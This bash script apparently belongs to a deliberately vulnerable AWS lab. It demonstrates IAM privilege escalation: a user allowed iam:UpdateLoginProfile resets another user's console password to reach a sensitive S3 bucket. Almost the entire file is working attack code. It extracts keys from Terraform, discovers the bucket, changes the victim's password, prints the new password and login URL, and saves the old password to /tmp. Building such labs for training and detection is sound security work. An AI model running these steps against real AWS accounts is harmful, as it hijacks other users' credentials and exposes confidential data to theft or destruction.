#!/bin/bash

# Demo script for iam:UpdateLoginProfile privilege escalation to S3 bucket access
# This script demonstrates how a user with UpdateLoginProfile permission can escalate to S3 bucket access

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
STARTING_USER="pl-prod-iam-006-to-bucket-starting-user"
BUCKET_USER="pl-prod-iam-006-to-bucket-user"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM UpdateLoginProfile to S3 Bucket Access Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Extract credentials from Terraform outputs
echo -e "${YELLOW}Step 1: Extracting credentials from Terraform outputs${NC}"
cd ../../../../../..  # Go to project root

# Get the module output
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_bucket_iam_006_iam_updateloginprofile.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials
ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
SECRET_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$ACCESS_KEY" == "null" ] || [ -z "$ACCESS_KEY" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

echo -e "${GREEN}✓ Retrieved credentials${NC}\n"

cd - > /dev/null  # Return to scenario directory

# Export credentials as environment variables
export AWS_ACCESS_KEY_ID=$ACCESS_KEY
export AWS_SECRET_ACCESS_KEY=$SECRET_KEY
unset AWS_SESSION_TOKEN  # Clear any session token

echo -e "${GREEN}✓ Successfully extracted and configured credentials${NC}\n"

# Generate a random password suffix (8 characters)
RANDOM_SUFFIX=$(openssl rand -hex 4)  # Generates 8 hex characters
NEW_PASSWORD="PathfindingLabs123!${RANDOM_SUFFIX}"  # New password with random suffix

# Step 2: Verify starting user identity
echo -e "${YELLOW}Step 2: Verifying identity as starting user${NC}"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    echo "Current identity: $CURRENT_USER"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 3: Discover target bucket
echo -e "${YELLOW}Step 3: Discovering target bucket${NC}"
# Try to get bucket name from Terraform output first
TERRAFORM_DIR="../../../../../.."
pushd $TERRAFORM_DIR > /dev/null
TARGET_BUCKET=$(terraform output -raw prod_one_hop_to_bucket_iam_updateloginprofile_sensitive_bucket_name 2>/dev/null || echo "")
popd > /dev/null

# If Terraform output not available, try to discover via naming pattern
if [ -z "$TARGET_BUCKET" ] || [ "$TARGET_BUCKET" == "null" ]; then
    echo "Terraform output not available, discovering bucket via API..."
    # Look for buckets matching our naming pattern
    TARGET_BUCKET=$(aws s3api list-buckets --query "Buckets[?starts_with(Name, 'pl-prod-iam-006-to-bucket-sensitive-data-')].Name | [0]" --output text 2>/dev/null || echo "")

    if [ -z "$TARGET_BUCKET" ] || [ "$TARGET_BUCKET" == "None" ]; then
        echo -e "${YELLOW}Warning: Could not discover target bucket${NC}"
        TARGET_BUCKET="pl-prod-iam-006-to-bucket-sensitive-data-${ACCOUNT_ID}"  # Fallback pattern
    fi
fi

echo "Target bucket: $TARGET_BUCKET"
echo -e "${GREEN}✓ Identified target bucket${NC}\n"

# Step 4: Get original password from Terraform output (for display purposes)
echo -e "${YELLOW}Step 4: Checking existing login profile${NC}"
pushd $TERRAFORM_DIR > /dev/null

ORIGINAL_PASSWORD=$(terraform output -raw prod_one_hop_to_bucket_iam_updateloginprofile_original_password 2>/dev/null || echo "")

popd > /dev/null

if [ -z "$ORIGINAL_PASSWORD" ] || [ "$ORIGINAL_PASSWORD" == "null" ]; then
    echo -e "${YELLOW}Note: Unable to retrieve original password from Terraform outputs${NC}"
    echo "The bucket user has an existing login profile but we don't know the current password"
else
    echo -e "${GREEN}✓ Found existing login profile for bucket user${NC}"
    echo "Current password is managed by Terraform (unknown to attacker)"
fi
echo ""

# Step 5: Verify bucket user has an existing login profile
echo -e "${YELLOW}Step 5: Verifying bucket user has an existing login profile${NC}"
echo "Checking for login profile for user: $BUCKET_USER"

if aws iam get-login-profile --user-name $BUCKET_USER &> /dev/null; then
    echo -e "${GREEN}✓ Confirmed: Login profile exists for $BUCKET_USER${NC}"
    LOGIN_PROFILE_INFO=$(aws iam get-login-profile --user-name $BUCKET_USER --output json)
    CREATED_DATE=$(echo $LOGIN_PROFILE_INFO | jq -r '.LoginProfile.CreateDate')
    echo "Login profile created: $CREATED_DATE"
else
    echo -e "${RED}⚠ No login profile exists for $BUCKET_USER${NC}"
    echo "This scenario requires the bucket user to have an existing login profile"
    exit 1
fi
echo ""

# Step 6: Verify we don't have S3 bucket access yet
echo -e "${YELLOW}Step 6: Verifying we don't have S3 bucket access yet${NC}"
echo "Target bucket: $TARGET_BUCKET"
echo "Attempting to list bucket contents (should fail)..."

if aws s3 ls s3://$TARGET_BUCKET &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have bucket access already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot access bucket (as expected)${NC}"
fi
echo ""

# Step 7: Update the login profile with a new password
echo -e "${YELLOW}Step 7: Updating login profile with new password${NC}"
echo "Changing password for user: $BUCKET_USER"
echo "New password: $NEW_PASSWORD"

# Save original password info for cleanup (if available)
if [ ! -z "$ORIGINAL_PASSWORD" ] && [ "$ORIGINAL_PASSWORD" != "null" ]; then
    echo "$ORIGINAL_PASSWORD" > /tmp/original_password_iam_006_bucket.txt
fi

aws iam update-login-profile \
    --user-name $BUCKET_USER \
    --password "$NEW_PASSWORD" \
    --no-password-reset-required 
    

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Successfully updated login profile!${NC}"
else
    echo -e "${RED}Failed to update login profile${NC}"
    exit 1
fi
echo ""

# Step 8: Display console login information
echo -e "${YELLOW}Step 8: Console login information${NC}"
CONSOLE_URL="https://${ACCOUNT_ID}.signin.aws.amazon.com/console"
echo "Console login URL: $CONSOLE_URL"
echo "Username: $BUCKET_USER"
echo "New password: $NEW_PASSWORD"
echo ""

echo -e "${GREEN}✓ Password successfully changed!${NC}"
echo -e "${YELLOW}The bucket user can now login to the AWS console with the new credentials${NC}"
echo ""
echo "  1. Login to AWS Console with the new password"
echo "  2. Access S3 through the console interface"
echo "  3. View and download sensitive data from the bucket"


echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (with iam:UpdateLoginProfile permission)"
echo "2. Updated password for: $BUCKET_USER (user with S3 bucket access)"
echo "3. Achieved: Access to sensitive S3 bucket"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER → (UpdateLoginProfile) → $BUCKET_USER → S3 Bucket Access"

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Password changed for user: $BUCKET_USER"
echo "- New console password: $NEW_PASSWORD"
echo "- Console login URL: $CONSOLE_URL"
if [ ! -z "$NEW_ACCESS_KEY" ]; then
    echo "- Temporary access key created: $NEW_ACCESS_KEY"
    echo "- Downloaded file location: $DOWNLOAD_FILE"
fi
if [ ! -z "$ORIGINAL_PASSWORD" ] && [ "$ORIGINAL_PASSWORD" != "null" ]; then
    echo "- Original password saved to: /tmp/original_password_iam_006_bucket.txt"
fi

echo -e "\n${YELLOW}Data Exfiltration Risk:${NC}"
echo "The compromised bucket user can now:"
echo "  • Login to AWS Console with stolen credentials"
echo "  • Access sensitive data in S3 bucket: $TARGET_BUCKET"
echo "  • Download and exfiltrate confidential information"
echo "  • Modify or delete sensitive data"

# Standardized test results output
echo ""
echo "TEST_RESULT:prod_one_hop_to_bucket_iam_updateloginprofile:SUCCESS"
echo "TEST_DETAILS:prod_one_hop_to_bucket_iam_updateloginprofile:Successfully gained S3 bucket access via UpdateLoginProfile escalation"
if [ ! -z "$NEW_ACCESS_KEY" ]; then
    echo "TEST_METRICS:prod_one_hop_to_bucket_iam_updateloginprofile:password_changed=true,console_access=true,bucket_accessed=true,data_exfiltrated=true"
else
    echo "TEST_METRICS:prod_one_hop_to_bucket_iam_updateloginprofile:password_changed=true,console_access=true,bucket_accessed=console_only"
fi
echo ""

echo -e "${RED}⚠ Warning: The bucket user's password has been changed!${NC}"
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""
